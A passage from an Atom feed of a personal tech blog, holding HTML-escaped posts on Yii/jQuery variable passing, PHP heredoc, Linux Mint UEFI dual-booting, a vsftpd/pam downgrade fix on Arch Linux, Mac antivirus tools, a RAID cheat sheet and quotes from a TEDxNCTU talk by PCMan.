    &lt;span class="err"&gt;$&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;#company-list&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;html&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="err"&gt;$&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;#loading-tmpl&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;text&lt;/span&gt;&lt;span class="p"&gt;());&lt;/span&gt;  
    &lt;span class="err"&gt;$&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;getJSON&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;myVar&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;url&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;name&lt;/span&gt; &lt;span class="o"&gt;!==&lt;/span&gt; &lt;span class="k"&gt;null&lt;/span&gt; &lt;span class="o"&gt;?&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;/name/&amp;#39;&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="nx"&gt;name&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt; &lt;span class="k"&gt;function&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;data&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;  
        &lt;span class="err"&gt;$&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;#company-list&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="k"&gt;empty&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;  
        &lt;span class="err"&gt;$&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;#company-tmpl&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;tmpl&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;data&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;appendTo&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;#company-list&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;  
    &lt;span class="p"&gt;});&lt;/span&gt;  
&lt;span class="p"&gt;}&lt;/span&gt;  

&lt;span class="o"&gt;...&lt;/span&gt;  
&lt;span class="cp"&gt;?&amp;gt;&lt;/span&gt;&lt;span class="x"&gt;  &lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;在 JavaScript 中，可以透過 &lt;code&gt;myVar.url&lt;/code&gt; 順利拿到 URL  &lt;/p&gt;
&lt;h2&gt;Appendix&lt;/h2&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="x"&gt;&amp;lt;&amp;lt;&amp;lt;EOD  &lt;/span&gt;
&lt;span class="x"&gt;...  &lt;/span&gt;
&lt;span class="x"&gt;EOD;  &lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;此種寫法在 PHP 中稱為 &lt;code&gt;HEREDOC&lt;/code&gt;  &lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;A third way to delimit strings is the heredoc syntax: &amp;lt;&amp;lt;&amp;lt;.&lt;br /&gt;
After this operator, an identifier is provided, then a newline.&lt;br /&gt;
The string itself follows, and then the same identifier again to close the quotation.  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;詳見官方說明 &lt;a href="http://www.php.net/manual/en/language.types.string.php#language.types.string.syntax.heredoc"&gt;PHP - HEREDOC syntax&lt;/a&gt;  &lt;/p&gt;
&lt;hr /&gt;
&lt;h2&gt;References&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://stackoverflow.com/questions/8912548/in-yii-pass-php-variables-to-javascript" title="In Yii, pass PHP variables to JavaScript"&gt;In Yii, pass PHP variables to JavaScript&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://api.jquery.com/jQuery.parseJSON/"&gt;jQuery.parseJSON&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="http://api.jquery.com/jquery.getjson/"&gt;jQuery.getJSON&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.yiiframework.com/doc/api/1.1/CClientScript#registerScript-detail"&gt;Yii - CClientScript &lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.yiiframework.com/doc/api/1.1/CJSON#encode-detail"&gt;Yii - CJSON&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="http://stackoverflow.com/questions/6924193/what-is-the-use-of-eod-in-php"&gt;What is the use of &amp;lt;&amp;lt;&amp;lt;EOD in PHP?&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;</summary><category term="Web"></category><category term="JavaScript"></category><category term="PHP"></category><category term="jQuery"></category><category term="Yii"></category></entry><entry><title>Artificial Intelligence Online Course</title><link href="https://blog.m157q.tw/posts/2014/02/27/artificial-intelligence-online-course/" rel="alternate"></link><published>2014-02-27T13:23:00+08:00</published><updated>2014-02-27T13:23:00+08:00</updated><author><name>m157q</name></author><id>tag:blog.m157q.tw,2014-02-27:posts/2014/02/27/artificial-intelligence-online-course/</id><summary type="html">&lt;p&gt;因為學校教授講課實在是太雜亂了  &lt;/p&gt;
&lt;p&gt;幾乎抓不太到重點  &lt;/p&gt;
&lt;p&gt;我覺得 AI 不應該是上起來這麼無聊雜亂的課  &lt;/p&gt;
&lt;p&gt;應該有個系統可以學習 連機器都可以有系統的 Machine Learning 了  &lt;/p&gt;
&lt;p&gt;不懂為啥教授可以教的這麼沒系統  &lt;/p&gt;
&lt;p&gt;雖然看得出來教授在這個領域的確懂得很多（和我上一些對自己教的東西都不熟的教授比起來）  &lt;/p&gt;
&lt;p&gt;但我還是決定自己找些相關的教材來看  &lt;/p&gt;
&lt;p&gt;第一個想到的就是 MIT 的 OCW  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://ocw.mit.edu/courses/electrical-engineering-and-computer-science/6-034-artificial-intelligence-fall-2010/"&gt;MITOCW - Artificial Intelligence&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;p&gt;2014/03/03  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://www.efytimes.com/e1/fullnews.asp?edid=127676"&gt;10 Online Courses To Learn Artificial Intelligence!&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.efytimes.com/e1/fullnews.asp?edid=131896"&gt;6 Best Websites On Aritificial Intelligence!&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;</summary><category term="AI"></category><category term="MITOCW"></category><category term="Coursera"></category><category term="Artificial Intelligence"></category></entry><entry><title>Antivirus software for Mac</title><link href="https://blog.m157q.tw/posts/2014/02/27/antivirus-software-for-mac/" rel="alternate"></link><published>2014-02-27T13:12:00+08:00</published><updated>2014-02-27T13:12:00+08:00</updated><author><name>m157q</name></author><id>tag:blog.m157q.tw,2014-02-27:posts/2014/02/27/antivirus-software-for-mac/</id><summary type="html">&lt;p&gt;Many people believe that Mac won't get virus.&lt;br /&gt;
While the Mac users are growing more and more nowadays,&lt;br /&gt;
Crackers won't give up the chances to attack the Mac computers.&lt;br /&gt;
So, we better install a antivirus software to prevent the attack from those bad guys.  &lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;&lt;a href="http://www.clamxav.com/"&gt;ClamXav&lt;/a&gt;  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;ClamXav is a free virus scanner for Mac OS X. It uses the very popular ClamAV open source antivirus engine as a back end and has the ability to detect both Windows and Mac threats.  &lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Only scan for virus and need manually start&lt;/strong&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;a href="http://www.sophos.com/en-us/products/free-tools/sophos-antivirus-for-mac-home-edition.aspx"&gt;SOPHOS - Antivirus for Mac Home Editon&lt;/a&gt;  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;A security suite for Mac including some features.\  &lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Not only scan for virus&lt;/strong&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ol&gt;</summary><category term="Mac"></category><category term="Antivirus"></category></entry><entry><title>Install Linux Mint 16 in Dual Boot with Win8 on Notebook with UEFI</title><link href="https://blog.m157q.tw/posts/2014/02/21/install-linux-mint-16-in-dual-boot-with-win8-on-notebook-with-uefi/" rel="alternate"></link><published>2015-10-26T13:53:00+08:00</published><updated>2015-10-26T13:53:00+08:00</updated><author><name>m157q</name></author><id>tag:blog.m157q.tw,2014-02-21:posts/2014/02/21/install-linux-mint-16-in-dual-boot-with-win8-on-notebook-with-uefi/</id><summary type="html">&lt;p&gt;有人不會裝，又剛好自己沒有在 UEFI 系統的 Win8 筆電上灌 Linux 的經驗，就想說來試試看。&lt;br /&gt;
(之前嘗試要幫人把 UEFI 系統的 Win8 灌成 Win7 失敗後，就覺得 UEFI + Win8 很難搞)  &lt;/p&gt;
&lt;p&gt;這次灌完後仍然覺得很討厭，所以紀錄一下方法。  &lt;/p&gt;
&lt;p&gt;前面一直到 LiveUSB 成功開啟的部份應該其他 Linux Distribution 的安裝也適用吧？  &lt;/p&gt;
&lt;p&gt;因為沒試過，所以只是猜測。  &lt;/p&gt;
&lt;p&gt;以下簡要紀錄過程  &lt;/p&gt;
&lt;hr /&gt;
&lt;ol&gt;
&lt;li&gt;到 &lt;a href="http://www.linuxmint.com/"&gt;Mint 官方網站&lt;/a&gt; 下載 Image 檔  &lt;ul&gt;
&lt;li&gt;&lt;a href="http://www.linuxmint.com/download.php"&gt;Download Linux Mint Latest Version&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;自行選擇 Window Manager 和符合的位元版本  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;將 .iso 檔製作成 LiveUSB  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;清出一個 Unallocated 的磁區給 Mint 安裝用  &lt;/li&gt;
&lt;li&gt;插入 Mint16 的 LiveUSB，要讓 Win8 讀到，待會要進 UEFI 調整開機順序  &lt;/li&gt;
&lt;li&gt;把 Windows 的 Fast Boot 關掉  &lt;ul&gt;
&lt;li&gt;Fast Boot 預設載入 Windows Kernel，如果沒關掉的話，用 LiveUSB 開機，進到 GRUB 選擇 Mint 開機後就會進入黑屏。  &lt;/li&gt;
&lt;li&gt;步驟  &lt;ol&gt;
&lt;li&gt;點選 Win8 桌面側欄的「設定」  &lt;/li&gt;
&lt;li&gt;點選最下方的「變更電腦設定」  &lt;/li&gt;
&lt;li&gt;點選左方側欄的「一般」  &lt;/li&gt;
&lt;li&gt;右方側欄拉到最下方，點選進階啟動中的「立即重新啟動」  &lt;/li&gt;
&lt;li&gt;出現畫面後，選擇「疑難排解」  &lt;/li&gt;
&lt;li&gt;點選「進階選項」  &lt;/li&gt;
&lt;li&gt;點選「UEFI韌體設定」  &lt;/li&gt;
&lt;li&gt;點選「重新啟動」，之後電腦會重開機進入 UEFI 設定介面  &lt;/li&gt;
&lt;li&gt;Boot 中的 Fast Boot 用空白鍵更改為 Disabled  &lt;/li&gt;
&lt;li&gt;將底下的 Boot Options Priorites 調整為 LiveUSB 為第一個  &lt;/li&gt;
&lt;li&gt;按 F10 Save &amp;amp; Exit -&amp;gt; Yes  &lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;重開機後，應該就會進入 LiveUSB 中  &lt;/li&gt;
&lt;li&gt;其他就參考 References 部分的第一篇文章，照著 Mint 的安裝流程安裝  &lt;ul&gt;
&lt;li&gt;切 /, /swap, /home  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;hr /&gt;
&lt;h2&gt;Refereneces&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://itsfoss.com/guide-install-linux-mint-16-dual-boot-windows/"&gt;Guide To Install Linux Mint 16 In Dual Boot With Windows&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="http://forums.linuxmint.com/viewtopic.php?f=46&amp;amp;t=155164"&gt;Black screen when boot from liveUSB to install Linux Mint 16&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;(dead) &lt;a href="http://forums.linuxmint.com/viewtopic.php?f=46&amp;amp;t=159972"&gt;Booting Linux Mint 16 from Live USB fails in initramfs&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="http://forums.linuxmint.com/viewtopic.php?f=46&amp;amp;t=153074"&gt;《SOLVED》Black screen before installation, Mint 16&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;</summary><category term="Linux"></category><category term="Linux Mint"></category><category term="Win8"></category><category term="UEFI"></category><category term="Dual Boot"></category></entry><entry><title>vsftpd virtual user broken after upgrade pam from 1.1.8-2 to 1.1.8-3 in Arch Linux</title><link href="https://blog.m157q.tw/posts/2014/02/21/vsftpd-virtual-user-broken-after-upgrade-pam-from-1-1-8-2-to-1-1-8-3-in-arch-linux/" rel="alternate"></link><published>2015-10-27T13:14:00+08:00</published><updated>2015-10-27T13:14:00+08:00</updated><author><name>m157q</name></author><id>tag:blog.m157q.tw,2014-02-21:posts/2014/02/21/vsftpd-virtual-user-broken-after-upgrade-pam-from-1-1-8-2-to-1-1-8-3-in-arch-linux/</id><summary type="html">&lt;p&gt;pam 升到 1.1.8-3 後，vsftpd 的 virtual user 功能就爛掉了  &lt;/p&gt;
&lt;p&gt;檢查了 &lt;code&gt;auth.log&lt;/code&gt; 以後，發現噴了  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;Feb 20 00:35:49 localhost vsftpd:  
PAM unable to dlopen(/usr/lib/security/pam_userdb.so):  
/usr/lib/security/pam_userdb.so: cannot open shared object file:  
No such file or directory  
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;進 &lt;code&gt;/usr/lib/security&lt;/code&gt; 裡查看，發現 &lt;code&gt;pam_userdb.so&lt;/code&gt; 消失了  &lt;/p&gt;
&lt;p&gt;推測問題出在這，到 Google 丟了 &lt;code&gt;/usr/lib/security/pam_userdb.so&lt;/code&gt; 進行搜尋  &lt;/p&gt;
&lt;p&gt;查到這兩篇文章  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://bbs.archlinux.org/viewtopic.php?pid=1382541"&gt;pam_userdb.so gone after upgrading pam-1.1.8-2 -&amp;gt; pam-1.1.8-3&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://bugs.archlinux.org/task/38848"&gt;FS#38848 - [pam] /usr/lib/security/pam_userdb.so missing&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;原來是被移除掉了  &lt;/p&gt;
&lt;p&gt;從底下的回應看起來好像只看到 vsftpd 的 virtual user 功能受到影響  &lt;/p&gt;
&lt;p&gt;兩篇的回應都有人提到 &lt;code&gt;pam_pwdfile&lt;/code&gt; 這個套件，&lt;br /&gt;
不過是在 AUR 上而非官方套件，而且用的人好像有點少，所以不考慮。  &lt;/p&gt;
&lt;p&gt;目前的解法還是用  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ sudo pacman -U /var/cache/pacman/pkg/pam-1.1.8-2-x86_64.pkg.tar.xz  
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;將 pam 先降級回 &lt;code&gt;pam 1.1.8-2&lt;/code&gt;  &lt;/p&gt;</summary><category term="Linux"></category><category term="Arch Linux"></category><category term="vsftpd"></category><category term="pam"></category><category term="sysadmin"></category></entry><entry><title>那些年，我們一起上的 BBS: 洪任諭(PCMan) 於 TEDxNCTU 2013</title><link href="https://blog.m157q.tw/posts/2014/01/14/pcman-speech-at-tedxnctu-2013/" rel="alternate"></link><published>2015-10-26T13:19:00+08:00</published><updated>2015-10-26T13:19:00+08:00</updated><author><name>m157q</name></author><id>tag:blog.m157q.tw,2014-01-14:posts/2014/01/14/pcman-speech-at-tedxnctu-2013/</id><summary type="html">&lt;p&gt;PCMan 2013/11/30 在新竹交通大學的演講  &lt;/p&gt;
&lt;h2&gt;影片&lt;/h2&gt;
&lt;iframe width="560" height="315" src="//www.youtube.com/embed/-tYj8QmyiCc" frameborder="0" allowfullscreen&gt;&lt;/iframe&gt;

&lt;h2&gt;逐字稿&lt;/h2&gt;
&lt;p&gt;&lt;a href="https://hackpad.com/-BBS--BqLE55Op9Lg"&gt;那些年，我們一起上的 BBS - 逐字稿: - hackpad.com&lt;/a&gt;  &lt;/p&gt;
&lt;hr /&gt;
&lt;p&gt;以下是我自己打的一些節錄，個人有稍微修改一些字詞，應該不致影響語意。  &lt;/p&gt;
&lt;p&gt;跟教育有關的部份真的是是心有戚戚焉啊...  &lt;/p&gt;
&lt;hr /&gt;
&lt;p&gt;「你知道素人跟專家最大的不同在哪裡嗎？&lt;br /&gt;
素人什麼都不會、什麼都不懂、什麼都沒有經驗&lt;br /&gt;
但是這並不是缺點，正因為素人什麼都不知道，&lt;br /&gt;
所以不知道有什麼困難，所以不會害怕困難&lt;br /&gt;
因為不知道要怕什麼，所以也什麼都不會怕，&lt;br /&gt;
所以不知不覺就把一件事給做完了&lt;br /&gt;
這是我在開發 PCMan 的時候所學到的」  &lt;/p&gt;
&lt;hr /&gt;
&lt;p&gt;「很多時候，問題不是我們學的東西不夠，而是我們學的東西太多了。&lt;br /&gt;
你受到太多的訓練，你受到太多的框架侷限。」  &lt;/p&gt;
&lt;hr /&gt;
&lt;p&gt;「學校教育的問題是，把太多的東西一次全部倒給你，然後分散在幾次期中考就考掉了。&lt;br /&gt;
學完這些東西以後，你一定會有個問題，我學這些東西要幹嘛？&lt;br /&gt;
我自己的學習方式是反過來的，我是先有問題，然後自己去找問題的答案。&lt;br /&gt;
最後也許我們學到的是一樣的東西，但是我的過程充滿樂趣，而你的卻會是充滿艱辛。」  &lt;/p&gt;
&lt;hr /&gt;
&lt;p&gt;「就好像你不會把整本英文字典都讀完才開始用英文，&lt;br /&gt;
你也不會把地圖全部背好了然後才出門，&lt;br /&gt;
你一定是遇到不會的，然後才去找答案，這其實是我們人類的本能，&lt;br /&gt;
可是我們的教育系統是反過來的，所以你要自己再把它顛倒回來。」  &lt;/p&gt;
&lt;hr /&gt;
&lt;p&gt;「光是只有動機是不夠的，不需要等你會了這個東西才去做，&lt;br /&gt;
因為世界上並沒有完美的的計畫，你可能計畫很久，然後怎麼想都有漏洞，&lt;br /&gt;
所以想到最後都沒有動手。其實，有些事是你做了之後才知道問題在哪裡的。&lt;br /&gt;
所以，稍微會一點就可以了，遇到不會的再查就好。&lt;br /&gt;
問題會一個一個慢慢的克服，我自己就是這樣走過來的。」  &lt;/p&gt;
&lt;hr /&gt;
&lt;p&gt;「學校其實還有另外一個問題，&lt;br /&gt;
就是大家都使用一樣的方法教學，教你一樣的東西，然後用一樣的方法評量。&lt;br /&gt;
而學生也只有分兩種，及格跟不及格。&lt;br /&gt;
不會有人在意你的個人特色和你到底會什麼東西，反正這套教材就塞給你了。」  &lt;/p&gt;
&lt;hr /&gt;
&lt;p&gt;「我們常常會笑韓國人喜歡整型，&lt;br /&gt;
不過，我問大家一個問題：&lt;br /&gt;
『你走在路上，看見整條街的人鼻子都一樣比較嚴重？還是腦子都一樣比較嚴重？』」  &lt;/p&gt;
&lt;hr /&gt;
&lt;p&gt;「你會想要怎樣與眾不同，不過這是個『假議題』。&lt;br /&gt;
其實從你在出生的那一刻起，你就跟別人不一樣了，你就與眾不同了，&lt;br /&gt;
只是我們在長大的過程中慢慢忘記了，所以今天把它想起來吧。」  &lt;/p&gt;
&lt;hr /&gt;
&lt;p&gt;「如果你有什麼想做但是沒有做的事，就動手去做吧，&lt;br /&gt;
其實沒有這麼困難，最困難的就是動手去做而已。&lt;br /&gt;
做的過程中遇到困難的話，再一個一個慢慢去查資料，其實你會克服的。」  &lt;/p&gt;
&lt;hr /&gt;
&lt;p&gt;「每個人都有一些他特別的地方，只是你要去把它找出來，&lt;br /&gt;
我們其實不需要兩千三百萬個考試第一名的人嘛，每個人應該有他自己的特色。」  &lt;/p&gt;
&lt;hr /&gt;
&lt;p&gt;「我在醫院每個月都會送走一些人，其中有一些是大老闆、有些人是總經理，&lt;br /&gt;
有一些甚至年紀比我小，他們最後散盡家財，可是連一個月的時間都買不到，&lt;br /&gt;
我相信他們在閉上眼睛之前，一定有一些事是想做但是沒有做的，&lt;br /&gt;
所以我後來有什麼想做的事，我就會不顧一切的去做，當然有時候還是會考慮一下。」  &lt;/p&gt;
&lt;hr /&gt;
&lt;p&gt;「有些事一開始看似很難，但其實你實際去做以後就會覺得沒有這麼難了。&lt;br /&gt;
這其實就很像溫水煮青蛙，最困難的步驟其實是抓青蛙，你只要把青蛙丟進去，&lt;br /&gt;
剩下的其實就是時間的問題了，所以不要害怕跨出第一步。」  &lt;/p&gt;
&lt;hr /&gt;
&lt;p&gt;「回想一下，你有沒有什麼一直想做，但沒有去做的事，&lt;br /&gt;
如果有的話，不要讓那些事等你太久。&lt;br /&gt;
而且事實上，能力不夠並不是問題。因為不會可以學，做了就會了。&lt;br /&gt;
所以很多事其實是需要你動手去做，而且是現在去做。&lt;br /&gt;
因為人生其實真的沒有那麼長。」  &lt;/p&gt;
&lt;hr /&gt;
&lt;p&gt;「如果你什麼都不會，你不用為此受到侷限。&lt;br /&gt;
因為你不是專家，所以你可以跳脫框架，你的思考不會受到傳統的規範，&lt;br /&gt;
有時候反而可以有所突破。」  &lt;/p&gt;
&lt;hr /&gt;
&lt;p&gt;「不管你喜不喜歡現在的工作和職業，&lt;br /&gt;
保有一個自己的興趣、發展自己的特色是很重要的，&lt;br /&gt;
如果你有自己的興趣的話，希望你不要放棄它，&lt;br /&gt;
永遠不要放棄一個讓自己與眾不同的機會，永遠。」  &lt;/p&gt;
&lt;hr /&gt;
&lt;h2&gt;Reference&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://gist.github.com/hychen/8389441"&gt;hychen 在 gist 上放的逐字稿&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;</summary><category term="PCMan"></category><category term="TEDxNCTU"></category><category term="Speech"></category></entry><entry><title>RAID Cheat Sheet</title><link href="https://blog.m157q.tw/posts/2014/01/12/raid-cheat-sheet/" rel="alternate"></link><published>2015-10-26T13:43:00+08:00</published><updated>2015-10-26T13:43:00+08:00</updated><author><name>m157q</name></author><id>tag:blog.m157q.tw,2014-01-12:posts/2014/01/12/raid-cheat-sheet/</id><summary type="html">&lt;h2&gt;Format of the note below&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;Type - Name  &lt;ul&gt;
&lt;li&gt;Minimum Disks (M)  &lt;/li&gt;
&lt;li&gt;Fault Tolerance Disks (F)  &lt;/li&gt;
&lt;li&gt;Attributes (A)  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;ul&gt;
&lt;li&gt;RAID0 - Non Redundant Striping  &lt;ul&gt;
&lt;li&gt;M: 2  &lt;/li&gt;
&lt;li&gt;F: 0  &lt;/li&gt;
&lt;li&gt;A: Block Level Striping  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;RAID1 - Mirrored Disks  &lt;ul&gt;
&lt;li&gt;M: 2  &lt;/li&gt;
&lt;li&gt;F: n-1  &lt;/li&gt;
&lt;li&gt;A: Mirroring  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;RAID2 - Memory Style Error Correcting Codes  &lt;ul&gt;
&lt;li&gt;M: 3  &lt;/li&gt;
&lt;li&gt;F: 1 (Can Recover)  &lt;/li&gt;
&lt;li&gt;A:  &lt;ul&gt;
&lt;li&gt;Bit Level Striping  &lt;/li&gt;
&lt;li&gt;Dedicated Hamming Code (Error Correction)  &lt;/li&gt;
&lt;li&gt;Recovery  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;RAID3 - Bit Interleaved Parity  &lt;ul&gt;
&lt;li&gt;M: 3  &lt;/li&gt;
&lt;li&gt;F: 1  &lt;/li&gt;
&lt;li&gt;A:  &lt;ul&gt;
&lt;li&gt;Bit Level Striping (Wikipedia said Byte Level)  &lt;/li&gt;
&lt;li&gt;Dedicated Parity Code (Error Detection)  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;RAID4 - Block Interleaved Parity  &lt;ul&gt;
&lt;li&gt;M: 3  &lt;/li&gt;
&lt;li&gt;F: 1  &lt;/li&gt;
&lt;li&gt;A:  &lt;ul&gt;
&lt;li&gt;Block Level Striping  &lt;/li&gt;
&lt;li&gt;Dedicated Parity Code (Error Detection)  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;RAID5 - Block Interleaved Distributed Parity  &lt;ul&gt;
&lt;li&gt;M: 3  &lt;/li&gt;
&lt;li&gt;F: 1  &lt;/li&gt;
&lt;li&gt;A:  &lt;ul&gt;
&lt;li&gt;Block Level Striping  &lt;/li&gt;
&lt;li&gt;Distributed Parity Code (Error Detection)  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;RAID6 - P + Q Redundancy  &lt;ul&gt;
&lt;li&gt;M: 4  &lt;/li&gt;
&lt;li&gt;F: 2  &lt;/li&gt;
&lt;li&gt;A:  &lt;ul&gt;
&lt;li&gt;Block Level Striping  &lt;/li&gt;
&lt;li&gt;Double Distributed Parity Code (Error Detection) aka &lt;a href="http://en.wikipedia.org/wiki/Reed%E2%80%93Solomon_error_correction"&gt;Reed-Solomon Code&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;RAID01 - RAID0 + RAID1  &lt;ul&gt;
&lt;li&gt;M: 4  &lt;/li&gt;
&lt;li&gt;F: ?  &lt;/li&gt;
&lt;li&gt;A: Striping First, then Mirroring.  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;RAID10 - RAID1 + RAID0  &lt;ul&gt;
&lt;li&gt;M: 4  &lt;/li&gt;
&lt;li&gt;F: ?  &lt;/li&gt;
&lt;li&gt;A: Mirroring First, then Striping.  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h2&gt;References&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://en.wikipedia.org/wiki/RAID"&gt;RAID - Wikipedia&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="http://en.wikipedia.org/wiki/Reed%E2%80%93Solomon_error_correction"&gt;Reed-Solomon Error Correction - Wikipedia&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;</summary><category term="RAID"></category><category term="Cheat Sheet"></category></entry><entry><title>Arch Linux Quick Installation with GPT in BIOS</title><link href="https://blog.m157q.tw/posts/2013/12/30/arch-linux-quick-installation-with-gpt-in-bios/" rel="alternate"></link><published>2015-10-27T19:08:00+08:00</published><updated>2015-10-27T19:08:00+08:00</updated><author><name>m157q</name></author><id>tag:blog.m157q.tw,2013-12-30:posts/2013/12/30/arch-linux-quick-installation-with-gpt-in-bios/</id><summary type="html">&lt;h2&gt;Preface&lt;/h2&gt;
&lt;p&gt;A quick installation based on &lt;a href="https://wiki.archlinux.org/index.php/Beginners'_Guide"&gt;Arch wiki - Beginners' Guide&lt;/a&gt;  &lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;WITHOUT NETWORK CONFIGURATION&lt;br /&gt;
(INSTALL IN VIRTUAL MACHINE USING DHCP).&lt;br /&gt;
YOU NEED TO SETUP THE NETWORK OF THE MACHINE FIRST.  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;hr /&gt;
&lt;h2&gt;Network&lt;/h2&gt;
&lt;p&gt;&lt;a href="https://wiki.archlinux.org/index.php/Network_configuration"&gt;Network configuration - ArchWiki&lt;/a&gt;  &lt;/p&gt;
&lt;hr /&gt;
